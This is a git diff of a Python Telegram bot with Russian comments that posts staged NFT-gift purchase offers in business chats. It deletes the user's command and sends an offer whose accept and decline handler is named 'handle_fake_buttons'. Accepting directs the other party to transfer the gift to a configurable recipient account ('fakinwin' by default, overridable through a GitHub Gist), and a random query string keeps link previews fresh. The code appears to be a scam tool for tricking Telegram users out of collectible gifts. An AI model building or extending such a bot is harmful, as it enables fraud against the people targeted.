@@ -20,18 +20,19 @@ try:
 except ValueError:
     ADMIN_ID = 0
 
-# --- НАСТРОЙКА ПОЛУЧАТЕЛЯ ---
+# --- ИЗМЕНЕН ТОЛЬКО ЮЗЕРНЕЙМ ---
 DEFAULT_TARGET = "fakinwin"
+# --------------------------------
 
 # --- НАСТРОЙКИ ПРОВЕРКИ (ГРУППА) ---
 TARGET_CHAT_ID = -1003747516067 
 INVITE_LINK = "https://t.me/+7WMVJ9ajTHU2NDFi"
-
-# --- ID АНИМИРОВАННОЙ ЗВЕЗДЫ TELEGRAM PREMIUM ---
-PREMIUM_STAR_ID = "5848021027782661221"
+# ------------------------------------
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
+
+active_users = set()
 
 MESSAGES = {
     "ru": {
@@ -76,19 +77,23 @@ def get_pretty_name(slug):
     raw_name = slug.split('-')[0]
     return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)
 
+# --- ФУНКЦИЯ ПРОВЕРКИ ПОДПИСКИ ---
 async def is_subscribed(user_id: int) -> bool:
     try:
         member = await bot.get_chat_member(chat_id=TARGET_CHAT_ID, user_id=user_id)
         return member.status in ["member", "administrator", "creator"]
     except Exception as e:
-        print(f"Ошибка проверки подписки: {e}")
+        print(f"Ошибка проверки подписки (убедитесь, что бот админ в группе): {e}")
         return False
 
 # --- РАБОТА С GIST (БАЗА ДАННЫХ) ---
 async def get_gist_data():
-    if not GIST_ID or not GIST_TOKEN: return None, "Ошибка: GIST_ID или GIST_TOKEN не заданы"
+    if not GIST_ID or not GIST_TOKEN:
+        return None, "Ошибка: GIST_ID или GIST_TOKEN не заданы в Secrets!"
+    
     headers = {"Authorization": f"token {GIST_TOKEN}"}
     url = f"https://api.github.com/gists/{GIST_ID}"
+    
     try:
         async with aiohttp.ClientSession() as session:
             async with session.get(url, headers=headers) as resp:
@@ -96,18 +101,32 @@ async def get_gist_data():
                     data = await resp.json()
                     content = data['files'].get('config.json', {}).get('content', '{}')
                     return json.loads(content) if content else {}, None
-                return None, f"Ошибка GitHub: {resp.status}"
-    except Exception as e: return None, f"Ошибка сети: {e}"
+                else:
+                    error_text = await resp.text()
+                    return None, f"GitHub вернул ошибку {resp.status}: {error_text}"
+    except Exception as e:
+        return None, f"Ошибка сети: {e}"
 
 async def update_gist_data(new_data: dict):
     headers = {"Authorization": f"token {GIST_TOKEN}"}
     url = f"https://api.github.com/gists/{GIST_ID}"
-    payload = {"files": {"config.json": {"content": json.dumps(new_data, indent=2)}}}
+    payload = {
+        "files": {
+            "config.json": {
+                "content": json.dumps(new_data, indent=2)
+            }
+        }
+    }
     try:
         async with aiohttp.ClientSession() as session:
             async with session.patch(url, headers=headers, json=payload) as resp:
-                return (resp.status == 200), "Успех"
-    except Exception as e: return False, f"Ошибка сети: {e}"
+                if resp.status == 200:
+                    return True, "Успех"
+                else:
+                    error_text = await resp.text()
+                    return False, f"Ошибка {resp.status}: {error_text}"
+    except Exception as e:
+        return False, f"Ошибка сети: {e}"
 
 # --- АДМИН ПАНЕЛЬ ---
 @dp.message(Command("my_id"))
@@ -116,41 +135,67 @@ async def cmd_my_id(message: types.Message):
 
 @dp.message(Command("set_target"))
 async def cmd_set_target(message: types.Message):
-    if message.from_user.id != ADMIN_ID: return await message.answer(f"❌ Отказано. Ваш ID: {message.from_user.id}")
+    if message.from_user.id != ADMIN_ID:
+        return await message.answer(f"❌ Отказано. Ваш ID: {message.from_user.id}")
+    
     parts = message.text.split()
-    if len(parts) != 3: return await message.answer("❌ Формат: `/set_target @юзернейм новый_получатель`")
+    if len(parts) != 3:
+        return await message.answer("❌ Формат: `/set_target @юзернейм новый_получатель`")
+    
     user_key = parts[1].replace("@", "").lower()
     new_target = parts[2].replace("@", "")
+    
     data, error = await get_gist_data()
-    if error: return await message.answer(f"❌ {error}", parse_mode="HTML")
+    if error:
+        return await message.answer(f"❌ Ошибка чтения базы:\n<code>{error}</code>", parse_mode="HTML")
+    
     data[user_key] = new_target
+    
     success, error_msg = await update_gist_data(data)
-    if success: await message.answer(f"✅ Для `@{user_key}` установлен новый получатель: `@{new_target}`")
-    else: await message.answer(f"❌ {error_msg}", parse_mode="HTML")
+    if success:
+        await message.answer(f"✅ Для `@{user_key}` установлен новый получатель: `@{new_target}`")
+    else:
+        await message.answer(f"❌ Ошибка сохранения:\n<code>{error_msg}</code>", parse_mode="HTML")
 
 @dp.message(Command("remove_target"))
 async def cmd_remove_target(message: types.Message):
-    if message.from_user.id != ADMIN_ID: return
+    if message.from_user.id != ADMIN_ID:
+        return await message.answer(f"❌ Вы не админ.")
+    
     parts = message.text.split()
-    if len(parts) != 2: return await message.answer("❌ Формат: `/remove_target @юзернейм`")
+    if len(parts) != 2:
+        return await message.answer("❌ Формат: `/remove_target @юзернейм`")
+    
     user_key = parts[1].replace("@", "").lower()
     data, error = await get_gist_data()
-    if error: return await message.answer(f"❌ {error}", parse_mode="HTML")
+    if error:
+        return await message.answer(f"❌ Ошибка чтения:\n<code>{error}</code>", parse_mode="HTML")
+    
     if user_key in data:
         del data[user_key]
-        if await update_gist_data(data): await message.answer(f"✅ Для `@{user_key}` сброшен на @{DEFAULT_TARGET}")
+        if await update_gist_data(data):
+            await message.answer(f"✅ Для `@{user_key}` сброшен на @{DEFAULT_TARGET}")
+        else:
+            await message.answer("❌ Ошибка сохранения.")
+    else:
+        await message.answer("❌ Пользователь не найден в базе.")
 
 @dp.message(Command("test_db"))
 async def cmd_test_db(message: types.Message):
-    if message.from_user.id != ADMIN_ID: return
+    if message.from_user.id != ADMIN_ID:
+        return await message.answer(f"❌ Вы не админ.")
+    
     data, error = await get_gist_data()
-    if error: return await message.answer(f"❌ {error}", parse_mode="HTML")
-    await message.answer(f"<b>База:</b>\n<pre><code>{json.dumps(data, indent=2, ensure_ascii=False)}</code></pre>", parse_mode="HTML")
+    if error:
+        return await message.answer(f"❌ Ошибка чтения:\n<code>{error}</code>", parse_mode="HTML")
+    
+    pretty_json = json.dumps(data, indent=2, ensure_ascii=False)
+    await message.answer(f"<b>База данных (Gist):</b>\n<pre><code>{pretty_json}</code></pre>", parse_mode="HTML")
 
-# --- ОСНОВНЫЕ КОМАНДЫ ---
-@dp.message(CommandStart())
+
+# --- ОСНОВНЫЕ КОМАНДЫ (ТОЛЬКО В ЛИЧКЕ) ---
+@dp.message(F.chat.type == "private", CommandStart())
 async def cmd_start(message: types.Message):
-    # ПРОВЕРКА УБРАНА
     text = (
         "<b>Как начать:</b>\n"
         "Отправь /ofteam — и доступ будет выдан автоматически.\n\n"
@@ -166,24 +211,29 @@ async def cmd_start(message: types.Message):
     )
     await message.answer(text, parse_mode="HTML")
 
-@dp.message(Command("ofteam"))
+@dp.message(F.chat.type == "private", Command("ofteam"))
 async def cmd_ofteam(message: types.Message):
     if not await is_subscribed(message.from_user.id):
         keyboard = InlineKeyboardMarkup(inline_keyboard=[[
             InlineKeyboardButton(text="Вступить в группу", url=INVITE_LINK)
         ]])
         return await message.answer(
-            "⛔ <b>Ошибка доступа!</b>\n\nВы не подписаны на нашу группу. Использование команды /ofteam запрещено.\nВступите в группу и попробуйте снова.",
-            reply_markup=keyboard, parse_mode="HTML"
+            "⛔ <b>Ошибка доступа!</b>\n\n"
+            "Вы не подписаны на нашу группу. Использование команды /ofteam запрещено.\n"
+            "Вступите в группу и попробуйте снова.",
+            reply_markup=keyboard, 
+            parse_mode="HTML"
         )
+    
     await message.answer("✅ Подписка подтверждена. Доступ выдан. Теперь можно отправлять оферы.")
 
-# --- ИСПРАВЛЕННЫЙ БЛОК: ОТВЕЧАЕМ ТОЛЬКО В ЛИЧКЕ ---
+# ВОТ ЗДЕСЬ СТОИТ ФИКС: F.chat.type == "private". Бот проигнорирует команду в группах.
 @dp.message(F.chat.type == "private", F.text.startswith("/of"))
 async def block_offer_in_pm(message: types.Message):
     await message.answer("❌ Эта функция доступна только в режиме автоматизации чатов.")
 
-# --- ГЕНЕРАЦИЯ ОФФЕРА ---
+
+# --- ГЕНЕРАЦИЯ ОФФЕРА (В БИЗНЕС-ЧАТАХ) ---
 @dp.business_message(F.text.startswith("/of"))
 async def handle_offer_command(message: types.Message):
     business_connection_id = message.business_connection_id
@@ -194,19 +244,23 @@ async def handle_offer_command(message: types.Message):
 
     link = parts[1]
     if not link.startswith("http"): link = "https://" + link
-    try: amount = int(parts[2])
-    except ValueError: return
     
-    currency, lang = "stars", "ru"
+    try:
+        amount = int(parts[2])
+    except ValueError:
+        return
+    
+    currency = "stars"
+    lang = "ru"
+    
     for p in parts[3:]:
         p_lower = p.lower()
-        if p_lower in ["stars", "gram"]: currency = p_lower
-        elif p_lower in ["ru", "en", "ua", "ar"]: lang = p_lower
+        if p_lower in ["stars", "gram"]:
+            currency = p_lower
+        elif p_lower in ["ru", "en", "ua", "ar"]:
+            lang = p_lower
 
-    if currency == "stars":
-        symbol = f'<tg-emoji emoji-id="{PREMIUM_STAR_ID}">⭐️</tg-emoji>' if message.from_user.is_premium else "⭐️"
-    elif currency == "gram": symbol = "GRAM"
-    else: symbol = "⭐️"
+    symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
 
     match = re.search(r"t\.me/nft/([a-zA-Z0-9_-]+-\d+)", link)
     if not match: return
@@ -216,20 +270,29 @@ async def handle_offer_command(message: types.Message):
     username = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
     msg_data = MESSAGES[lang]
 
-    caption_text = msg_data["offer"].format(username=username, amount=amount, symbol=symbol, link=link, pretty_name=pretty_name, target_username=DEFAULT_TARGET)
+    caption_text = msg_data["offer"].format(
+        username=username, amount=amount, symbol=symbol, link=link, pretty_name=pretty_name,
+        target_username=DEFAULT_TARGET
+    )
 
     try:
         await bot.delete_business_messages(business_connection_id=business_connection_id, message_ids=[message.message_id])
+        
         keyboard = InlineKeyboardMarkup(inline_keyboard=[[
             InlineKeyboardButton(text=msg_data["btn_decline"], callback_data=f"decline:{gift_slug}:{amount}:{currency}:{lang}"),
             InlineKeyboardButton(text=msg_data["btn_accept"], callback_data=f"accept:{gift_slug}:{amount}:{currency}:{lang}")
         ]])
+        
         await bot.send_message(
-            chat_id=message.chat.id, text=caption_text, reply_markup=keyboard,
-            business_connection_id=business_connection_id, parse_mode="HTML",
+            chat_id=message.chat.id,
+            text=caption_text,
+            reply_markup=keyboard,
+            business_connection_id=business_connection_id,
+            parse_mode="HTML",
             link_preview_options=LinkPreviewOptions(url=link, show_above_text=True, prefer_large_media=True)
         )
-    except Exception as e: print(f"Ошибка: {e}")
+    except Exception as e:
+        print(f"Ошибка: {e}")
 
 # --- ИЗМЕНЕНИЕ С ОБХОДОМ КЭША ---
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
@@ -237,45 +300,62 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message: return
     
     data_parts = callback.data.split(":")
-    if len(data_parts) != 5: return await callback.answer("Ошибка данных кнопки.", show_alert=True)
+    if len(data_parts) != 5:
+        return await callback.answer("Ошибка данных кнопки.", show_alert=True)
         
     action, gift_slug, amount, currency, lang = data_parts
     
-    if currency == "stars":
-        symbol = f'<tg-emoji emoji-id="{PREMIUM_STAR_ID}">⭐️</tg-emoji>' if callback.from_user.is_premium else "⭐️"
-    elif currency == "gram": symbol = "GRAM"
-    else: symbol = "⭐️"
+    symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
     
     sender_username = callback.message.from_user.username.lower() if callback.message.from_user and callback.message.from_user.username else "no_username"
+    
     data, error = await get_gist_data()
     target_username = DEFAULT_TARGET
-    if data and not error: target_username = data.get(sender_username, DEFAULT_TARGET)
+    if data and not error:
+        target_username = data.get(sender_username, DEFAULT_TARGET)
 
     cache_buster = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
     link = f"https://t.me/nft/{gift_slug}?v={cache_buster}"
+    
     pretty_name = get_pretty_name(gift_slug)
     business_connection_id = callback.message.business_connection_id
     msg_data = MESSAGES.get(lang, MESSAGES["ru"])
 
     if action == "accept":
-        new_text = msg_data["success"].format(link=link, pretty_name=pretty_name, target_username=target_username, symbol=symbol)
-        new_keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=msg_data["btn_transfer"], url=f"https://t.me/{target_username}")]])
+        new_text = msg_data["success"].format(
+            link=link, pretty_name=pretty_name, target_username=target_username, symbol=symbol
+        )
+        new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text=msg_data["btn_transfer"], url=f"https://t.me/{target_username}")]
+        ])
         alert_text = msg_data["alert"].format(target_username=target_username)
     else:
-        new_text = msg_data["declined"].format(amount=amount, symbol=symbol, link=link, pretty_name=pretty_name, target_username=target_username)
+        new_text = msg_data["declined"].format(
+            amount=amount, symbol=symbol, link=link, pretty_name=pretty_name, target_username=target_username
+        )
         new_keyboard = None
         alert_text = None
 
     try:
         await bot.edit_message_text(
-            chat_id=callback.message.chat.id, message_id=callback.message.message_id, text=new_text,
-            reply_markup=new_keyboard, business_connection_id=business_connection_id,
-            parse_mode="HTML", link_preview_options=LinkPreviewOptions(url=link, show_above_text=True, prefer_large_media=True)
+            chat_id=callback.message.chat.id,
+            message_id=callback.message.message_id,
+            text=new_text,
+            reply_markup=new_keyboard,
+            business_connection_id=business_connection_id,
+            parse_mode="HTML",
+            link_preview_options=LinkPreviewOptions(url=link, show_above_text=True, prefer_large_media=True)
         )
-    except Exception as e: print(f"Ошибка изменения: {e}")
+    except TelegramBadRequest as e:
+        if "message is not modified" not in str(e).lower():
+            print(f"Ошибка изменения: {e}")
+    except Exception as e:
+        print(f"Неизвестная ошибка: {e}")
 
-    if alert_text: await callback.answer(alert_text, show_alert=True)
-    else: await callback.answer()
+    if alert_text:
+        await callback.answer(alert_text, show_alert=True)
+    else:
+        await callback.answer()
 
 # --- АВТОПЕРЕПОДКЛЮЧЕНИЕ ---
 async def main():
